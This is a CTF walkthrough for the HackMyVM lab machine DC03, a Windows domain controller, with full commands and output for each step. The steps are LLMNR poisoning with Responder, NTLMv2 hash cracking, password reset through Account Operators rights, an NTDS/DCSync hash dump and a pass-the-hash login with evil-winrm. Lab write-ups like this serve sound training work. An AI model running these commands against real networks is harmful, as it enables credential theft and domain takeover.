---
title: CTF Walkthrough for HackMyVM Machine DC03
date: 2024-10-24 00:00:00 +0300
category: [Walkthrough, CTF]
tags: [HackMyVM, Writeup, Active Directory, Pass the Hash attack, DCSync attack]   
image:
  path: /assets/img/posts/walthrough/hackmyvm/2024-10-24-dc03/box-dc03.png
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about DC03 a machine among HackMyVM machines. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
This machine was set up using VirtualBox as recommended by the creator and the Network configuration was changed to 'Nat Network'.
### Machine Description
Name: Literal<br>
Goal: Get two flags<br>
OS: Windows<br>
Download link: [DC03](https://downloads.hackmyvm.eu/dc03.zip)<br>
### Tools used
1) fping<br>
2) Nmap<br>
3) CrackMapExec<br>
4) Impacket tools<br>
5) Hashcat<br>
6) Bloodhound<br>

## Reconnaissance

First of all, we need to identify our target on the network. We do this by performing a host discovery scan on the current subnet.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/DC03/Scans/Service]
└─$ fping -aqg 10.0.2.16/24
<SNIP>
10.0.2.16
10.0.2.33
```

After we have obtained the IP address of our target, we can perform a service scan to identify running services on the target.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/DC03/Scans/Service]
└─$ nmap -sC -sV -Pn -n 10.0.2.33 -oN service-scan.nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-19 08:54 BST
Nmap scan report for 10.0.2.33
Host is up (0.00082s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-19 17:51:53Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:cd:9d:2f (Oracle VirtualBox virtual NIC)
| smb2-time: 
|   date: 2024-10-19T17:51:53
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 9h57m38s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.99 seconds
```

The target runs Kerberos, LDAP, and SMB, we can deduce from this that the target is a Windows domain controller. We can see in the scan's result the domain i.e. `SOUPEDECODE.LOCAL` of the target and also the name of the domain controller `DC01`. We can add this information to our /etc/hosts file.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/DC03/Scans/Service]
└─$ echo "10.0.2.33\tSOUPEDECODE.LOCAL  DC01.SOUPEDECODE.LOCAL"  | sudo tee -a /etc/hosts
10.0.2.33       SOUPEDECODE.LOCAL  DC01.SOUPEDECODE.LOCAL
```

## Exploitation

Since we are on the same LAN as the domain controller we can perform LLMNR \| NBT-NS poisoning attack using the responder.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/DC03/Scans/AD Enumeration]
└─$ sudo responder -I eth0
<SNIP>
[*] [MDNS] Poisoned answer sent to fe80::8946:76ef:7852:5ca2 for name FileServer.local
[SMB] NTLMv2-SSP Client   : fe80::8946:76ef:7852:5ca2
[SMB] NTLMv2-SSP Username : soupedecode\xkate578
[SMB] NTLMv2-SSP Hash     : xkate578::soupedecode:e64b0be3891aa287:E6181478C75D169CD446BC569D402ADF:01010000000000008048E2CA3522DB01DCD78269F140B76B0000000002000800550053005800500001001E00570049004E002D004C00470055003700410044004C003800<SNIP>0430041004C00070008008048E2CA3522DB01060004000200000008003000300000000000000000000000004000001BAAF5583C712D88226DBB9E785345304AB5EB5C2F75804BF8CA1B7B5C99FB370A0010000000000000000000000000000000000009001E0063006900660073002F00460069006C0065005300650072007600650072000000000000000000
```

After some minutes, we will see that the responder has captured the NTLMv2 hash of the xkate578 user. We can crack this hash using Hashcat.

```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/DC03/Scans/AD Enumeration]
└─$ hashcat -a 0 -m 5600 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting
<SNIP>
XKATE578::soupedecode:e64b0be3891aa287:e6181478c75d169cd446bc569d402adf:01010000000000008048e2ca3522db01dcd78269f140b76b0000000002000800550053005800500001001e00570049004e002d004c00470055003700410044004c00380<SNIP>00430041004c00070008008048e2ca3522db01060004000200000008003000300000000000000000000000004000001baaf5583c712d88226dbb9e785345304ab5eb5c2f75804bf8ca1b7b5c99fb370a0010000000000000000000000000000000000009001e0063006900660073002f00460069006c0065005300650072007600650072000000000000000000:<REDACTED>
                                                          
<SNIP>
Started: Sat Oct 19 16:49:34 2024
Stopped: Sat Oct 19 16:49:38 2024
```

Now that we have a valid AD user, we can enumerate SMB shares where we will find the user flag.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/DC03]
└─$ crackmapexec smb DC01.SOUPEDECODE.LOCAL -u xkate578 -p <REDACTED> --shares
SMB         SOUPEDECODE.LOCAL 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         SOUPEDECODE.LOCAL 445    DC01             [+] SOUPEDECODE.LOCAL\xkate578:jesuschrist 
SMB         SOUPEDECODE.LOCAL 445    DC01             [+] Enumerated shares
SMB         SOUPEDECODE.LOCAL 445    DC01             Share           Permissions     Remark
SMB         SOUPEDECODE.LOCAL 445    DC01             -----           -----------     ------
SMB         SOUPEDECODE.LOCAL 445    DC01             ADMIN$                          Remote Admin
SMB         SOUPEDECODE.LOCAL 445    DC01             C$                              Default share
SMB         SOUPEDECODE.LOCAL 445    DC01             IPC$            READ            Remote IPC
SMB         SOUPEDECODE.LOCAL 445    DC01             NETLOGON        READ            Logon server share 
SMB         SOUPEDECODE.LOCAL 445    DC01             share           READ,WRITE      
SMB         SOUPEDECODE.LOCAL 445    DC01             SYSVOL          READ            Logon server share 

┌──(pentester㉿kali)-[~/Desktop/HackMyVM/DC03]
└─$ smbclient -U 'xkate578' '//DC01.SOUPEDECODE.LOCAL/share'
Password for [WORKGROUP\xkate578]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sun Oct 20 00:52:09 2024
  ..                                  D        0  Thu Aug  1 06:38:08 2024
  desktop.ini                       AHS      282  Thu Aug  1 06:38:08 2024
  user.txt                            A       70  Thu Aug  1 06:39:25 2024

                12942591 blocks of size 4096. 10819634 blocks available
```

## Post Exploitation

We can use this user's credentials to enumerate the active directory environment using Bloodhound. Due to some issues during name resolution, we first set a fake DNS server on our localhost using `dnschef` and used that DNS server's IP as the name server IP while running Bloodhound.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/DC03/Misc File]
└─$ dnschef --fakeip 10.0.2.33&
[1] 37629

┌──(pentester㉿kali)-[~/Desktop/HackMyVM/DC03/Misc File]
└─$           _                _          __  
<SNIP>
(01:14:43) [*] DNSChef started on interface: 127.0.0.1
(01:14:43) [*] Using the following nameservers: 8.8.8.8
(01:14:43) [*] Cooking all A replies to point to 10.0.2.33

┌──(pentester㉿kali)-[~/Desktop/HackMyVM/DC03/Misc File]
└─$ bloodhound-python  -u xkate578 -p <REDACTED> -ns 127.0.0.1 -d SOUPEDECODE.LOCAL  -dc DC01.SOUPEDECODE.LOCAL --zip
WARNING: Could not find a global catalog server, assuming the primary DC has this role
If this gives errors, either specify a hostname with -gc or disable gc resolution with --disable-autogc
INFO: Getting TGT for user
<SNIP>
INFO: Done in 00M 30S
INFO: Compressing output into 20241020011449_bloodhound.zip
```

We can now start Neo4j database and Bloodhound to view the data we collected above.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/DC03/Misc File]
└─$ sudo neo4j start &
[1] 53732

┌──(pentester㉿kali)-[~/Desktop/HackMyVM/DC03/Misc File]
└─$ Directories in use:
<SNIP>
Started neo4j (pid:53777). It is available at http://localhost:7474
There may be a short delay until the server is ready.

[1]  + done       sudo neo4j start
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/DC03/Misc File]
└─$ bloodhound  &
```

If we check the group membership of the user xkate578 we owned, we will notice that this user is memebr of the Account Operator group. The Account Operators group grants limited account creation privileges to a user. Members of this group can create and modify most types of accounts, including accounts for users, Local groups, and Global groups. Group members can log in locally to domain controllers.
Members of the Account Operators group can't manage the Administrator user account, the user accounts of administrators, or the Administrators, Server Operators, Account Operators, Backup Operators, or Print Operators groups. Members of this group can't modify user rights.
![](/assets/img/posts/walthrough/hackmyvm/2024-10-24-dc03/capture-1.png)

Now that we know that we have the limited ability to create and modify accounts in the AD environment, let's find the shortest path to domain admin using Bloodhound 
![](/assets/img/posts/walthrough/hackmyvm/2024-10-24-dc03/capture-2.png)

We will see that the user FBETH103 is a member of the Operators goup which in turn is a memeber Domain Admins group. Since the Operators group is not listed above, its members accounts in this group can be modify by memebrs of the Account Operator group. Let's change the password of this user to a password we know.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/DC03]
└─$ impacket-changepasswd SOUPEDECODE.LOCAL/fbeth103@10.0.2.33 -altuser xkate578 -altpass <REDACTED> -newpass str@ngpassword -reset         
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Setting the password of SOUPEDECODE.LOCAL\fbeth103 as SOUPEDECODE.LOCAL\xkate578
[*] Connecting to DCE/RPC as SOUPEDECODE.LOCAL\xkate578
[*] Password was changed successfully.
[!] User no longer has valid AES keys for Kerberos, until they change their password again.
```
*NB: We can do the same thing using rpcclient with the command `setuserinfo2 <username> 23 <new_password>`*

Since FBETH103 is memebr of the Domain Admins group through nested group memebrship, we can use this account to perform a DCSync attack against the domain controller.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/DC03]
└─$ crackmapexec smb DC01.SOUPEDECODE.LOCAL -u fbeth103 -p str@ngpassword --ntds
SMB         SOUPEDECODE.LOCAL 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         SOUPEDECODE.LOCAL 445    DC01             [+] SOUPEDECODE.LOCAL\fbeth103:str@ngpassword (Pwn3d!)
SMB         SOUPEDECODE.LOCAL 445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         SOUPEDECODE.LOCAL 445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:2176416a80e4f62804f101d3a55d6c93:::
SMB         SOUPEDECODE.LOCAL 445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         SOUPEDECODE.LOCAL 445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fb9d84e61e78c26063aced3bf9398ef0:::
SMB         SOUPEDECODE.LOCAL 445    DC01             soupedecode.local\bmark0:1103:aad3b435b51404eeaad3b435b51404ee:d72c66e955a6dc0fe5e76d205a630b15:::
SMB         SOUPEDECODE.LOCAL 445    DC01             soupedecode.local\otara1:1104:aad3b435b51404eeaad3b435b51404ee:ee98f16e3d56881411fbd2a67a5494c6:::
SMB         SOUPEDECODE.LOCAL 445    DC01             soupedecode.local\kleo2:1105:aad3b435b51404eeaad3b435b51404ee:bda63615bc51724865a0cd0b4fd9ec14:::
SMB         SOUPEDECODE.LOCAL 445    DC01             soupedecode.local\eyara3:1106:aad3b435b51404eeaad3b435b51404ee:68e34c259878fd6a31c85cbea32ac671:::
<SNIP>
```

Once we have the administrator password, we can stop the DCSync attack and login to the domain controller using pass the hash.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/DC03]
└─$ evil-winrm -u administrator -H 2176416a80e4f62804f101d3a55d6c93 -i 10.0.2.33
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls ..\Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         7/31/2024  10:33 PM             70 root.txt
```
*NB: In a real-world assessment, we could dive into the full DCSync attack, followed by an offline brute-force attempt. This approach also provides the client with valuable insights into password security.*

## Conclusion

Congratulations! In this walkthrough, you have used LLMNR \| NBT-NS poisoning attack to capture and crack the password of a member of the Account Operators group. Finally, you used the Account Operators group membership privileges to change the password of an account with domain admin privileges through nested group memebrship. This machine was designed to show how the use of weak passwords and deprecated protocols could seriously affect the security posture of an organisation. Thank you for following up on this walkthrough.
